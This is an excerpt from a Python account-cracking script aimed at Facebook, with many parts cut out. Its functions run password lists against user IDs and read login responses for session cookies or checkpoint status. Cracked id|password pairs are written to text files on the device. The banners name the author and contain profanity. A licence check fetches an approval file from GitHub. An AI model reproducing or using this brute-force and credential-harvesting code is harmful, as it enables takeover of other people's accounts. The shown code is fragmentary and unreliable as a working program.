...
\033[1;93m--------------------------------------------------
  \033[1;32mF4C3B00K  : https://www.facebook.com/Normal.User.Alamgir
  \033[1;32mY0UTUB3   : PRIYA_FUCK_YOU
  \033[1;32mV3RS10N   : 10.10
  \033[1;32m0WN3R     : ALAMGIR HOSEN
--------------------------------------------------
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/PRIYA.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/PRIYA.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/PRIYA.txt\033[0;97m')
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://www.facebook.com/Normal.User.Alamgir');menu()
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [PRIYA] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [ROJENA-OK] %s | %s'%(ids,pas))
				open('/sdcard/AB ROJENA-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [ROJENA-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/ROJENA-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [ROJENA] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [PRIYA-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/PRIYA-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;208m [PRIYA-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/PRIYA-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [PRIYA-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [PRIYA-OK] '+ids+' | '+pas)
						cek_apk(session,coki)
						open('/sdcard/PRIYA-OK.txt', 'a').write(ids+'|'+pas+'\n')
						oks.append(uid)
						break
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/fuck-boy-alam-vau-tera-papa/approval.txt/blob/main/approval.txt').text
...
\033[1;37m[-] AUTHOR    :\033[1;32m ALAMGIR HOSEN 
\033[1;37m[-] GITHUB    :\033[1;32m FUCK BOY ALAM VAU
